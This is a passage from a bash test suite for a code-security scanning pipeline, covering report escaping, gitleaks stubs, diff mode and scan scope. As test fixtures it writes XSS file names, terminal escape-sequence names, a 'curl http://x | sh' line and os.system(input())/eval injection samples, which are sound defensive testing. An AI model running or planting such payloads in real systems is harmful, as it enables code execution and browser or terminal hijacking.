n = [c.coordinate for ws in wb for row in ws.iter_rows() for c in row if c.data_type == 'f']
t = [c.value for ws in wb for row in ws.iter_rows() for c in row if isinstance(c.value, str) and c.value.startswith('=')]
print('formulas=%d strings=%d' % (len(n), len(t)))")
            assert_contains "$XLF" "formulas=0" "no cell of the Excel report is a live formula, whatever the file names say"
            assert_not_contains "$XLF" "strings=0" "…and the names that look like formulas are kept as text"
        else
            fail_test "Excel report with formula-like file names generates" "generate_excel_report.py failed"
        fi
    else
        skip_test "Excel report" "openpyxl not installed"
    fi

    # Redirected output must not contain terminal escape sequences.
    if [[ "$RUN_OUT" == *$'\033[K'* ]]; then
        fail_test "no erase-line escape codes when output is redirected" \
                  "found \\033[K in captured output"
    else
        ok_test "no erase-line escape codes when output is redirected"
    fi

    # The HTML report embeds file paths and finding text, and both come from the
    # repository being scanned: a file can be NAMED <img src=x onerror=…>, and a
    # jar entry can carry the same text into a finding message. Written
    # unescaped, either runs in the reviewer's browser when they open the report.
    XSS="${SCRATCH}/xss_repo"
    mkdir -p "$XSS"
    echo hello > "$XSS/<img src=x onerror=alert(1)>.txt"
    python3 - "$XSS/hostile.jar" <<'PYEOF'
import sys, zipfile
with zipfile.ZipFile(sys.argv[1], "w") as z:
    z.writestr("../<script>alert(2)</script>.sh", "x")
PYEOF
    run_pipeline "$XSS" --quiet
    XSS_HTML=$(cat "${RUN_JSON%.json}.html" 2>/dev/null || true)
    assert_not_contains "$XSS_HTML" "<img src=x onerror" \
        "HTML report: a hostile file name is not written as markup"
    assert_not_contains "$XSS_HTML" "<script>alert(2)" \
        "HTML report: a hostile jar entry name in a finding is not written as markup"
    assert_contains "$XSS_HTML" "&lt;img src=x onerror" \
        "HTML report: the hostile file name is shown escaped, not dropped"

    # The console helpers used `echo -e`, which turns a literal \033 in a file name
    # or a jar entry name into a real escape byte: a terminal can be retitled, or
    # worse, by whoever names a file.
    ESCD="${SCRATCH}/esc_repo"
    mkdir -p "$ESCD"
    printf 'password = "hunter2hunter2"\n' > "$ESCD/esc\\033]0;pwned\\007.txt"
    python3 - "$ESCD/hostile.jar" <<'PYEOF'
import sys, zipfile
with zipfile.ZipFile(sys.argv[1], "w") as z:
    z.writestr("../esc\\033]0;pwned\\007.sh", "x")
PYEOF
    run_pipeline "$ESCD"
    assert_not_contains "$RUN_OUT" $'\033]0;' \
        "console output: a literal \\033 in a file or entry name is not turned into an escape byte"

    # The other half: a file whose name really contains the ESC byte. printf %s
    # prints it raw, so the helpers also replace control bytes, and so does the
    # findings summary ai_transit.sh prints through jq.
    ESCR="${SCRATCH}/esc_raw_repo"
    mkdir -p "$ESCR"
    printf 'password = "hunter2hunter2"\n' > "$ESCR/$(printf 'raw\033]0;pwned\007.txt')"
    run_pipeline "$ESCR"
    assert_not_contains "$RUN_OUT" $'\033]0;' \
        "console output: a real ESC byte in a file name is not passed to the terminal"
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER E — Diff mode (needs git)
# ═════════════════════════════════════════════════════════════════════════════
group "Layer E — diff mode"
if ! _skipping; then
    if ! command -v git &>/dev/null; then
        skip_test "diff mode scans only changed files" "git not installed"
    else
        REPO="${SCRATCH}/diffrepo"
        mkdir -p "$REPO/src"
        git init -q "$REPO"
        git -C "$REPO" config user.email test@example.com
        git -C "$REPO" config user.name  test
        echo 'print("unchanged")' > "$REPO/src/untouched.py"
        git -C "$REPO" add -A && git -C "$REPO" commit -qm base
        BASE=$(git -C "$REPO" rev-parse HEAD)
        cp "${FIXTURES}/rules/sql_injection.py" "$REPO/src/added.py"
        git -C "$REPO" add -A && git -C "$REPO" commit -qm change

        run_pipeline "$REPO" --since "$BASE"
        assert_contains "$RUN_OUT" "1 file(s) will be scanned" \
            "diff mode scans exactly the changed file"
        assert_contains "$RUN_OUT" "Layer 5: 1 files scanned" \
            "diff mode scan count matches the changed-file count"

        # Without --since, .git must not be copied at all: on a large repo the
        # history is gigabytes copied only to be deleted moments later.
        run_pipeline "$REPO" --quiet
        FETCHED=$(ls -d "${RUN_WORK}"/fetch/repo_* 2>/dev/null | head -1 || true)
        if [[ -z "$FETCHED" ]]; then
            FETCHED=$(ls -d "${RUN_WORK}"/quarantine/repo_* 2>/dev/null | head -1 || true)
        fi
        if [[ -n "$FETCHED" ]]; then
            if [[ -d "${FETCHED}/.git" ]]; then
                fail_test "local copy excludes .git" "${FETCHED}/.git exists"
            else
                ok_test "local copy excludes .git"
            fi
        else
            skip_test "local copy excludes .git" "no fetched directory found"
        fi
    fi
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER G — The customised deployment
# scan_pipeline.sh takes an optional report directory and scanning name, has no
# online mode, secret-scans with gitleaks, writes one structured record per FAIL,
# ships layers 3 and 6 switched off (and says so in the coverage block), and exits
# non-zero unless the verdict is PASS.
# ═════════════════════════════════════════════════════════════════════════════
group "Layer G — report directory, offline-only, gitleaks, layers 3 and 6"
if ! _skipping; then
    GW="${SCRATCH}/g_work"; GR="${SCRATCH}/g_reports"; mkdir -p "$GW" "$GR"
    g_scan() {   # g_scan <dir> [args…]; sets GOUT, GEC
        GOUT=$(cd "$ROOT_DIR" && WORK_DIR="$GW" timeout 300 bash ./scan_pipeline.sh "$@" 2>&1); GEC=$?
    }
    g_json() { python3 -c "
import json,sys
d=json.load(open(sys.argv[1]))
for k in sys.argv[2].split('.'):
    d=d.get(k) if isinstance(d,dict) else None
print(d if d is not None else '')
" "$1" "$2" 2>/dev/null || echo ""; }

    # <dir> <report_dir> <name>, with a flag after them as callers have always passed one.
    g_scan "${FIXTURES}/vulnerable" "$GR" nightly --quiet
    GJ="${GR}/report_scan_nightly.json"
    assert_file_exists "$GJ" "report dir + name: the JSON report is report_scan_<name>.json"
    assert_file_exists "${GR}/report_scan_nightly.html" "report dir + name: so is the HTML report"
    assert_eq "FAIL" "$(printf '%s\n' "$GOUT" | tail -n 1)" "the verdict is still the last line of output"
    assert_eq "1" "$GEC" "a FAIL verdict is also the exit status"
    assert_eq "REJECTED" "$(g_json "$GJ" decision)" "report: decision is REJECTED for a FAIL"
    assert_eq "#B02A37"  "$(g_json "$GJ" status_color)" "report: status colour for a rejection"
    assert_eq "#F8D7DA"  "$(g_json "$GJ" status_background)" "report: status background for a rejection"
    assert_eq "nightly"  "$(g_json "$GJ" scan_name)" "report: scan_name is the third argument"
    assert_contains "$(g_json "$GJ" source.directory)" "vulnerable" "report: source names the scanned directory"
    assert_eq "64" "$(g_json "$GJ" source.sha256 | tr -d '\n' | wc -c | tr -d ' ')" "report: source carries a SHA-256"
    SHAPE=$(python3 -c "
import json,sys
d=json.load(open(sys.argv[1]))
need={'tool','category','severity','rule_id','rule_name','file','message'}
f=d['findings']
print(type(f).__name__, type(d['findings_by_file']).__name__, all(need <= set(r) for r in f), len(f) > 0)
" "$GJ" 2>/dev/null || echo "unreadable")
    assert_eq "list dict True True" "$SHAPE" \
        "report: findings are structured records; the per-file dictionary is findings_by_file"
    assert_eq "0" "$(ls "$GW"/findings_*.jsonl 2>/dev/null | wc -l | tr -d ' ')" \
        "the temporary findings file does not outlive the scan"

    # A PASS is APPROVED and exits 0.
    g_scan "${FIXTURES}/clean" "$GR" calm
    assert_eq "0" "$GEC" "a PASS verdict exits 0"
    assert_eq "APPROVED" "$(g_json "${GR}/report_scan_calm.json" decision)" "report: decision is APPROVED for a PASS"
    assert_eq "#198754"  "$(g_json "${GR}/report_scan_calm.json" status_color)" "report: status colour for an approval"

    # Without the optional arguments the report stays where ai_transit.sh reads it.
    g_scan "${FIXTURES}/clean" --quiet
    assert_eq "0" "$GEC" "the one-argument form still works, with a flag after it"
    assert_eq "1" "$(ls "$GW"/reports/report_2*.json 2>/dev/null | wc -l | tr -d ' ')" \
        "one-argument form: the report is still ${GW##*/}/reports/report_<timestamp>.json"

    # The arguments are checked.
    g_scan "${FIXTURES}/clean" "$GR" "../escape"
    assert_eq "1" "$GEC" "a scanning name with a slash is refused"
    assert_contains "$GOUT" "scanning_name must not contain" "…and says why"
    g_scan "${FIXTURES}/clean" "${SCRATCH}/no_such_dir" x
    assert_eq "1" "$GEC" "a report directory that does not exist is refused"

    # Layers 3 and 6 are off by default, and the report says so instead of omitting them.
    assert_contains "$(g_json "${GR}/report_scan_calm.json" coverage.L3_dependency_cve)" "skipped:disabled" \
        "layer 3 is recorded as skipped (disabled), not left out"
    assert_contains "$(g_json "${GR}/report_scan_calm.json" coverage.L6_licence)" "skipped:disabled" \
        "layer 6 is recorded as skipped (disabled), not left out"
    assert_contains "$(g_json "${GR}/report_scan_calm.json" coverage_gaps)" "L3_dependency_cve" \
        "a disabled layer is a coverage gap"
    g_scan "${FIXTURES}/clean" "$GR" both_on
    GEC_BOTH=$(cd "$ROOT_DIR" && WORK_DIR="$GW" RUN_SCA=true RUN_SCANCODE=true timeout 300 bash ./scan_pipeline.sh \
        "${FIXTURES}/clean" "$GR" both_on >/dev/null 2>&1; echo $?)
    assert_not_contains "$(g_json "${GR}/report_scan_both_on.json" coverage.L3_dependency_cve)" "disabled" \
        "RUN_SCA=true runs layer 3 again"
    assert_not_contains "$(g_json "${GR}/report_scan_both_on.json" coverage.L6_licence)" "disabled" \
        "RUN_SCANCODE=true runs layer 6 again"

    # No online mode.
    g_scan "${FIXTURES}/clean" "$GR" calm2
    assert_contains "$GOUT" "Offline mode: no scanner will attempt a network call" "offline mode is on without being asked"
    OUT_ONLINE=$(cd "$ROOT_DIR" && OFFLINE=false WORK_DIR="$GW" timeout 300 bash ./scan_pipeline.sh "${FIXTURES}/clean" 2>&1)
    assert_contains "$OUT_ONLINE" "OFFLINE=false ignored" "asking for OFFLINE=false is refused with a warning"
    assert_contains "$OUT_ONLINE" "Offline mode: no scanner will attempt a network call" "…and the scan is offline anyway"

    # gitleaks replaces betterleaks. A stub records how it is called and what it returns.
    GST="${SCRATCH}/g_stubs"; mkdir -p "$GST"
    # The stub records every call, answers --help like a current gitleaks, keeps a copy of the
    # config it was given, writes the JSON report named by GITLEAKS_STUB_REPORT, and prints a
    # marker to both streams so a test can see whether tool output reaches the console.
    cat > "${GST}/gitleaks" <<EOF
#!/bin/sh
echo "\$@" >> "${GST}/calls.txt"
if [ "\$1 \$2" = "detect --help" ]; then
    echo "  --no-banner  --redact  --log-level  --gitleaks-ignore-path  --ignore-gitleaks-allow"
    exit 0
fi
cfg=""; rep=""
while [ \$# -gt 0 ]; do
    case "\$1" in --config) cfg="\$2" ;; --report-path) rep="\$2" ;; esac
    shift
done
[ -n "\$cfg" ] && cp "\$cfg" "${GST}/seen_config.toml"
echo "LEAKED-SECRET-MARKER"
echo "LEAKED-SECRET-MARKER" >&2
if [ -n "\${GITLEAKS_STUB_REPORT:-}" ] && [ -n "\$rep" ]; then cp "\${GITLEAKS_STUB_REPORT}" "\$rep"; fi
exit \${GITLEAKS_STUB_EXIT:-0}
EOF
    chmod +x "${GST}/gitleaks"
    rm -f "${GST}/calls.txt"
    OUT_GL=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=1 WORK_DIR="$GW" timeout 300 \
        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" leaks 2>&1); EC_GL=$?
    assert_eq "1" "$EC_GL" "gitleaks exiting 1 (leaks found) fails the scan"
    assert_contains "$OUT_GL" "gitleaks:secrets_detected" "…with the gitleaks finding"
    assert_contains "$(cat "${GST}/calls.txt" 2>/dev/null)" "detect --no-git --source ${FIXTURES}/clean" \
        "gitleaks is called as: detect --no-git --source <dir>"
    REC=$(python3 -c "
import json,sys
d=json.load(open(sys.argv[1]))
r=[x for x in d['findings'] if x['tool']=='gitleaks']
print(len(r), r[0]['category'], r[0]['severity'], r[0]['file']) if r else print('none')
" "${GR}/report_scan_leaks.json" 2>/dev/null || echo unreadable)
    assert_eq "1 secret CRITICAL ." "$REC" "the gitleaks finding is a structured record about the whole directory"
    assert_eq "ran" "$(g_json "${GR}/report_scan_leaks.json" coverage.L1_secrets_gitleaks)" "coverage names L1_secrets_gitleaks"
    OUT_GL0=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=0 WORK_DIR="$GW" timeout 300 \
        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" noleaks 2>&1); EC_GL0=$?
    assert_eq "0" "$EC_GL0" "gitleaks exiting 0 (nothing found) leaves a clean repo passing"
    assert_eq "0" "$(grep -c 'betterleaks' "${ROOT_DIR}/scan_pipeline.sh" | tr -d ' ')" \
        "scan_pipeline.sh no longer refers to betterleaks"

    # ── gitleaks runs on the pipeline's terms, not the scanned repository's ───────────────
    GLREPO="${SCRATCH}/g_glrepo"; rm -rf "$GLREPO"; mkdir -p "$GLREPO"
    echo 'x = 1' > "${GLREPO}/leak.py"
    printf "[allowlist]\npaths = ['.*']\n" > "${GLREPO}/.gitleaks.toml"
    printf '[{"File":"%s/leak.py","StartLine":3,"RuleID":"generic-api-key","Secret":"REDACTED"}]\n' "$GLREPO" \
        > "${SCRATCH}/g_stub_report.json"
    rm -f "${GST}/calls.txt" "${GST}/seen_config.toml"
    OUT_GL2=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=1 GITLEAKS_STUB_REPORT="${SCRATCH}/g_stub_report.json" \
        WORK_DIR="$GW" timeout 300 bash ./scan_pipeline.sh "$GLREPO" "$GR" gl2 2>&1); EC_GL2=$?
    GCALLS=$(cat "${GST}/calls.txt" 2>/dev/null)
    assert_eq "1" "$EC_GL2" "a repository that carries its own .gitleaks.toml still fails on a leak"
    assert_contains "$GCALLS" "--config" "gitleaks is given a configuration of the pipeline's own"
    assert_contains "$(cat "${GST}/seen_config.toml" 2>/dev/null)" "useDefault = true" "…which only extends gitleaks' built-in rules"
    assert_not_contains "$(cat "${GST}/seen_config.toml" 2>/dev/null)" "allowlist" "…and is not the repository's .gitleaks.toml"
    assert_contains "$GCALLS" "--ignore-gitleaks-allow" "inline gitleaks:allow comments are ignored"
    assert_contains "$GCALLS" "--gitleaks-ignore-path" "the repository's .gitleaksignore is not read"
    assert_contains "$GCALLS" "--redact" "the secret is redacted in gitleaks' report"
    assert_contains "$OUT_GL2" "repository_allowlist_ignored" "a repository .gitleaks.toml is reported as ignored"
    assert_not_contains "$OUT_GL2" "LEAKED-SECRET-MARKER" "gitleaks output never reaches the console"
    GREC=$(python3 -c "
import json,sys
d=json.load(open(sys.argv[1]))
r=[x for x in d['findings'] if x['tool']=='gitleaks']
print(r[0]['rule_id'], r[0]['line'], r[0]['severity'], r[0]['file'], r[0]['message']) if r else print('none')
" "${GR}/report_scan_gl2.json" 2>/dev/null || echo unreadable)
    assert_eq "generic-api-key 3 CRITICAL leak.py gitleaks:generic-api-key:line3" "$GREC" \
        "each leak is a FAIL with its own file, line and rule"

    # gitleaks failing outright is not a clean scan.
    OUT_GL3=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=2 WORK_DIR="$GW" timeout 300 \
        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" gl3 2>&1); EC_GL3=$?
    assert_eq "1" "$EC_GL3" "gitleaks exiting with an error fails closed"
    assert_contains "$OUT_GL3" "gitleaks:scan_error_exit_2" "…and says it was an error, not a leak"
    assert_contains "$(g_json "${GR}/report_scan_gl3.json" coverage.L1_secrets_gitleaks)" "skipped:gitleaks failed" \
        "…and coverage does not claim the layer ran"

    # A finding gitleaks or ClamAV reports is critical, so --min-severity critical must not let it through.
    OUT_GL4=$(cd "$ROOT_DIR" && PATH="${GST}:$PATH" GITLEAKS_STUB_EXIT=1 MIN_SEVERITY=critical WORK_DIR="$GW" timeout 300 \
        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" gl4 2>&1); EC_GL4=$?
    assert_eq "1" "$EC_GL4" "--min-severity critical still fails on a gitleaks leak"

    # Severity is read from the Semgrep severity field, never from the message text after it.
    SGS="${SCRATCH}/g_sgstub"; mkdir -p "$SGS" "${SCRATCH}/g_sgcache/semgrep-rules"
    for r in owasp-top-ten cwe-top-25 security-audit secrets; do echo "rules: []" > "${SCRATCH}/g_sgcache/semgrep-rules/${r}.yaml"; done
    cat > "${SGS}/semgrep" <<EOF
#!/bin/sh
echo '{"results":[{"check_id":"rule.x","path":"${FIXTURES}/clean/t.py","start":{"line":2},"extra":{"message":"see :LOW: note","severity":"ERROR"}}]}'
EOF
    chmod +x "${SGS}/semgrep"
    OUT_SG=$(cd "$ROOT_DIR" && PATH="${SGS}:$PATH" OFFLINE_CACHE="${SCRATCH}/g_sgcache" WORK_DIR="$GW" timeout 300 \
        bash ./scan_pipeline.sh "${FIXTURES}/clean" "$GR" sg 2>&1); EC_SG=$?
    assert_eq "1" "$EC_SG" "a Semgrep ERROR whose message text contains ':LOW:' is still blocking"
    assert_eq "HIGH" "$(python3 -c "
import json,sys
d=json.load(open(sys.argv[1])); r=[x for x in d['findings'] if x['tool']=='semgrep']
print(r[0]['severity'] if r else 'none')" "${GR}/report_scan_sg.json" 2>/dev/null)" "…and its structured record says HIGH"

    # ── hostile and unusual inputs ───────────────────────────────────────────────────────
    NU="${SCRATCH}/g_nonutf"; rm -rf "$NU"; mkdir -p "$NU"
    printf 'import os\nos.system("curl http://x | sh")\n' > "${NU}/$(printf 'bad\xff\xfename.py')"
    g_scan "$NU" "$GR" nonutf
    assert_eq "1" "$GEC" "a file name that is not valid UTF-8 does not abort the scan"
    assert_eq "ok 1" "$(python3 -c "
import json,sys
d=json.load(open(sys.argv[1])); print('ok', len(d['findings']))" "${GR}/report_scan_nonutf.json" 2>/dev/null || echo broken)" \
        "…and the report is valid and still carries the finding"

    GD="${SCRATCH}/g_stale"; rm -rf "$GD"; mkdir -p "$GD/work"; printf '%s:' "${FIXTURES}/vulnerable/none.txt" > "$GD/work/.diff_files"
    OUT_ST=$(cd "$ROOT_DIR" && WORK_DIR="$GD/work" timeout 300 bash ./scan_pipeline.sh "${FIXTURES}/vulnerable" 2>&1)
    assert_contains "$OUT_ST" "Ignoring" "a stale .diff_files is ignored when SINCE_COMMIT is not set"
    assert_eq "FAIL" "$(printf '%s\n' "$OUT_ST" | tail -n 1)" "…so the repository is actually scanned"
    OUT_DM=$(cd "$ROOT_DIR" && SINCE_COMMIT=abc WORK_DIR="$GD/work" timeout 300 bash ./scan_pipeline.sh "${FIXTURES}/clean" 2>&1)
    assert_contains "$OUT_DM" "Diff mode: 0 file(s) will be scanned" "diff mode with no matching files runs"
    assert_not_contains "$OUT_DM" "unbound variable" "…instead of aborting on an empty associative array"

    EA="${SCRATCH}/g_emptyallow"; rm -rf "$EA"; mkdir -p "$EA"; cp -r "${FIXTURES}/clean/." "$EA/"; echo '[]' > "$EA/.transit-allow.json"
    g_scan "$EA" "$GR" emptyallow
    assert_not_contains "$GOUT" "unbound variable" "an allowlist of [] does not abort the scan"
    assert_eq "0" "$GEC" "…and the scan completes"

    g_scan "${FIXTURES}/vulnerable/" "$GR" slash
    assert_eq "0" "$(python3 -c "
import json,sys
d=json.load(open(sys.argv[1])); print(sum(1 for f in d['findings'] if f['file'].startswith('/')))" "${GR}/report_scan_slash.json" 2>/dev/null)" \
        "a trailing slash on the scan directory does not put absolute paths in the findings"

    HS="${SCRATCH}/g_hash"; rm -rf "$HS"; mkdir -p "$HS"; echo one > "$HS/f.txt"
    g_scan "$HS" "$GR" hash1; echo two > "$HS/f.txt"; g_scan "$HS" "$GR" hash2
    assert_eq "differs same" "$(python3 -c "
import json,sys
a=json.load(open(sys.argv[1])); b=json.load(open(sys.argv[2]))
print('differs' if a['source']['sha256']!=b['source']['sha256'] else 'same', 'same' if a['repo_hash']==b['repo_hash'] else 'differs')" \
        "${GR}/report_scan_hash1.json" "${GR}/report_scan_hash2.json" 2>/dev/null)" \
        "source.sha256 hashes content: it changes when a file's content does"

    for bad in ".hidden" "$(printf 'two\nlines')" "$(printf 'x%.0s' $(seq 1 151))"; do
        g_scan "${FIXTURES}/clean" "$GR" "$bad"
        assert_eq "1" "$GEC" "an unusable scanning name is refused: $(printf '%s' "$bad" | head -c 12 | tr -c '[:print:]' '?')…"
    done
    assert_eq "0" "$(ls "$GR"/*.tmp 2>/dev/null | wc -l | tr -d ' ')" "a finished report leaves no temporary file behind"

    STD_OFF=$(g_json "${GR}/report_scan_calm.json" standards)
    STD_ON=$(g_json "${GR}/report_scan_both_on.json" standards)
    assert_not_contains "$STD_OFF" "SCA-CVE" "the report does not claim SCA while layer 3 is off"
    assert_not_contains "$STD_OFF" "ScanCode" "…nor the licence standard while layer 6 is off"
    assert_contains "$STD_ON" "SCA-CVE" "…and does once RUN_SCA=true"

    # The Docker route has to be able to use the same switches and the offline cache.
    assert_contains "$(grep -E 'RUN_SCA' "${ROOT_DIR}/docker-run.sh")" "RUN_SCANCODE" "docker-run.sh forwards RUN_SCA and RUN_SCANCODE"
    assert_contains "$(cat "${ROOT_DIR}/docker-run.sh")" ":/offline-cache:ro" "docker-run.sh mounts the offline cache read-only"
    assert_eq "0" "$(grep -ci 'betterleaks' "${ROOT_DIR}/Dockerfile" | tr -d ' ')" "the Dockerfile no longer builds betterleaks"
    assert_contains "$(cat "${ROOT_DIR}/Dockerfile")" "zricethezav/gitleaks/v8@v" "the Dockerfile builds gitleaks from its declared module path"
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER H — The Python helpers in transit/
# The office, jar, PDF and manifest readers, the report writer and the tool result readers used to be
# heredocs inside scan_pipeline.sh. They are files under transit/ now, run by path by the bash engine and
# importable by the Python engine (PYTHON_PORT_PLAN.md, phase 1). These checks keep that arrangement honest.
# ═════════════════════════════════════════════════════════════════════════════
group "Layer H — shared Python helpers (transit/)"
if ! _skipping; then
    HELPERS="containers/jar.py containers/office.py containers/pdf.py scanners/manifests.py tools/gitleaks.py tools/scancode.py report_json.py"
    for _h in $HELPERS; do
        assert_file_exists "${ROOT_DIR}/transit/${_h}" "helper exists: transit/${_h}"
        if python3 -m py_compile "${ROOT_DIR}/transit/${_h}" 2>/dev/null; then
            ok_test "transit/${_h} compiles"
        else
            fail_test "transit/${_h} compiles" "py_compile failed"
        fi
        assert_contains "$(grep -c "TRANSIT_DIR/${_h}" "${ROOT_DIR}/scan_pipeline.sh")" "1" \
            "scan_pipeline.sh calls transit/${_h} exactly where the heredoc used to be"
    done
    assert_eq "0" "$(grep -c "<<'PY" "${ROOT_DIR}/scan_pipeline.sh" | tr -d ' ')" \
        "scan_pipeline.sh holds no embedded Python heredoc any more"

    # A scan whose helpers cannot be found must stop loudly, not report that nothing was found.
    NOT="${SCRATCH}/h_notransit"; rm -rf "$NOT"; mkdir -p "$NOT"
    cp "${ROOT_DIR}/scan_pipeline.sh" "$NOT/"
    OUT_NT=$(cd "$NOT" && WORK_DIR="${NOT}/work" bash ./scan_pipeline.sh "${FIXTURES}/clean" 2>&1); EC_NT=$?
    assert_eq "1" "$EC_NT" "scan_pipeline.sh without transit/ next to it exits 1"
    assert_contains "$OUT_NT" "transit/ not found next to scan_pipeline.sh" "…and says what is missing"

    # The tamper-evidence manifest, the image and the offline bundle must all carry the helpers: they run
    # inside every scan, so code that is not hashed or not shipped is a hole or a broken install.
    MAN="${SCRATCH}/h_manifest"; rm -rf "$MAN"; mkdir -p "$MAN/transit/containers"
    echo 'x = 1' > "$MAN/a.py"; echo 'x = 2' > "$MAN/transit/containers/jar.py"; echo 'x = 3' > "$MAN/transit/__init__.py"
    COVERED=$(cd "$ROOT_DIR" && python3 -I -c "
import sys, pathlib
sys.path.insert(0, '.')
import selfcheck
print(' '.join(str(p) for p in selfcheck.bundle_files(pathlib.Path(sys.argv[1]))))" "$MAN" 2>/dev/null)
    assert_contains "$COVERED" "transit/containers/jar.py" "the integrity manifest covers helpers below transit/"
    assert_contains "$COVERED" "transit/__init__.py" "…including the package marker"
    assert_contains "$(cat "${ROOT_DIR}/Dockerfile")" "transit" "the Dockerfile copies transit/ into the image"
    assert_contains "$(cat "${ROOT_DIR}/prepare_offline_install.sh")" "transit" "the offline install bundle stages transit/"
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER I — What scanning examines, and the gates for the Python engine
# The built-in exclusions (build/, vendor/, target/ …) used to be matched against the WHOLE path, so a
# repository under any directory with such a name was pruned entirely and passed having examined nothing.
# The conformance gates below are the ones the Python engine has to meet (PYTHON_PORT_PLAN.md, phase 0).
# ═════════════════════════════════════════════════════════════════════════════
group "Layer I — scan scope and Python-engine gates"
if ! _skipping; then
    I_HOSTILE() {   # I_HOSTILE <dir>: a repository the scan must fail
        mkdir -p "$1"
        printf 'import os\nos.system(input())\nprint(eval(input()))\n' > "$1/app.py"
        printf 'password = "hunter2hunter2"\n' > "$1/cfg.py"
    }
    I_RUN() {       # I_RUN <dir> <name>; sets IEC and IV (the verdict in the report)
        local rep="${SCRATCH}/i_rep"; mkdir -p "$rep"
        (cd "$ROOT_DIR" && WORK_DIR="${SCRATCH}/i_work" timeout 300 bash ./scan_pipeline.sh --quiet "$1" "$rep" "$2" >/dev/null 2>&1); IEC=$?
        IV=$(python3 -c "
import json,sys
print(json.load(open(sys.argv[1]))['verdict'])" "${rep}/report_scan_$2.json" 2>/dev/null || echo none)
    }
    IR="${SCRATCH}/i_roots"; rm -rf "$IR"
    for _anc in "ok" "build" "node_modules/x" "a/vendor/b" "target" "we[ir]d*" "dist/.git"; do
        I_HOSTILE "${IR}/${_anc}/repo"
        _n=$(printf '%s' "$_anc" | tr -c 'A-Za-z0-9' '_')
        I_RUN "${IR}/${_anc}/repo" "anc${_n}"
        assert_eq "FAIL" "$IV" "a hostile repository is still FAIL when its path contains '${_anc}' above the scan root"
    done

    # Inside the repository the built-in names still prune a directory, and only a directory.
    IP="${SCRATCH}/i_inside"; rm -rf "$IP"; mkdir -p "$IP/build" "$IP/src"
    printf 'import os\nos.system(input())\n' > "$IP/build/gen.py"; printf 'print(1)\n' > "$IP/src/ok.py"
    I_RUN "$IP" inside_dir
    assert_eq "PASS" "$IV" "a directory called build/ inside the repository is still not scanned"
    IF="${SCRATCH}/i_file"; rm -rf "$IF"; mkdir -p "$IF"
    printf 'import os\nos.system(input())\neval(input())\n' > "$IF/vendor"
    printf 'password = "hunter2hunter2"\n' > "$IF/build"
    I_RUN "$IF" inside_file
    assert_eq "FAIL" "$IV" "a regular FILE named vendor or build is scanned (only directories are pruned)"

    # .transitignore entries still exclude a file or a directory, anchored on the scan root.
    IT="${SCRATCH}/i_ignore"; rm -rf "$IT"; I_HOSTILE "$IT"; printf 'print(1)\n' > "$IT/ok.py"; printf 'cfg.py\napp.py\n' > "$IT/.transitignore"
    I_RUN "$IT" ignore_files
    assert_eq "PASS" "$IV" ".transitignore still excludes the files it names"
    ITD="${SCRATCH}/i_ignore_dir"; rm -rf "$ITD"; I_HOSTILE "$ITD/pkg/legacy"; printf 'print(1)\n' > "$ITD/ok.py"; printf 'pkg/legacy\n' > "$ITD/.transitignore"
    I_RUN "$ITD" ignore_dir
    assert_eq "PASS" "$IV" "…and a directory with a path inside the repository"

    # The relative form of the scan root, which find reports as ./…
    IRL="${SCRATCH}/i_rel/build/repo"; I_HOSTILE "$IRL"
    (cd "$IRL" && WORK_DIR="${SCRATCH}/i_work" timeout 300 bash "${ROOT_DIR}/scan_pipeline.sh" --quiet . "${SCRATCH}/i_rep" relroot >/dev/null 2>&1)
    assert_eq "FAIL" "$(python3 -c "
import json,sys
print(json.load(open(sys.argv[1]))['verdict'])" "${SCRATCH}/i_rep/report_scan_relroot.json" 2>/dev/null || echo none)" \
        "a relative scan root ('.') under a build/ directory is scanned too"

    # ── Gates for the Python engine (docs/python_port_thin_plan.md) ───────────────────────
    CONF="${ROOT_DIR}/tests/conformance"
    for _f in check_schema.py family_diff.py conformance.py; do
        assert_file_exists "${CONF}/${_f}" "conformance tooling exists: tests/conformance/${_f}"
    done
    assert_file_exists "${ROOT_DIR}/docs/engine_contract.md" "the engine contract is in the repository"
    assert_file_exists "${ROOT_DIR}/docs/engine_divergences.md" "…with its divergence register"
    assert_file_exists "${ROOT_DIR}/docs/report.schema.json" "…and the report schema"

    OUT_SC=$(cd "$ROOT_DIR" && timeout 600 python3 -I "${CONF}/check_schema.py" 2>&1); EC_SC=$?
    assert_eq "0" "$EC_SC" "check_schema.py: the bash engine's reports conform to the schema and the invariants"
    [[ "$EC_SC" == 0 ]] || printf '%s\n' "$OUT_SC" | tail -n 8 >&2

    OUT_CF=$(cd "$ROOT_DIR" && timeout 1800 python3 -I "${CONF}/conformance.py" check 2>&1); EC_CF=$?
    assert_eq "0" "$EC_CF" "conformance.py check: the bash engine still reproduces all stored golden reports"
    [[ "$EC_CF" == 0 ]] || printf '%s\n' "$OUT_CF" | tail -n 25 >&2
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER J — Bash hardening from the owner's decision record of 2026-11-13
# Each block below pins one entry of docs/engine_divergences.md (D-003 … D-042) and was seen RED against
# the script as it stood before the change (git show HEAD:scan_pipeline.sh) before the change was made.
# Stubs stand in for every scanner, as in Layer G: only npm, file, strings, unzip and jq exist on the CI host.
# ═════════════════════════════════════════════════════════════════════════════
group "Layer J — bash hardening (decision record 2026-11-13)"
if ! _skipping; then
    JW="${SCRATCH}/j_work"; JR="${SCRATCH}/j_rep"; mkdir -p "$JW" "$JR"
    JENV=()
    j_scan() {   # j_scan <dir> <name>   (extra environment in JENV); sets JOUT, JEC, JREP
        JREP="${JR}/report_scan_$2.json"; rm -f "$JREP"
        JOUT=$(cd "$ROOT_DIR" && env ${JENV[@]+"${JENV[@]}"} WORK_DIR="${JWD:-$JW}" timeout 300 bash ./scan_pipeline.sh "$1" "$JR" "$2" 2>&1); JEC=$?
    }
    j_py() {     # j_py <report> <python expression over d and a> [a]; prints the value, or "unreadable"
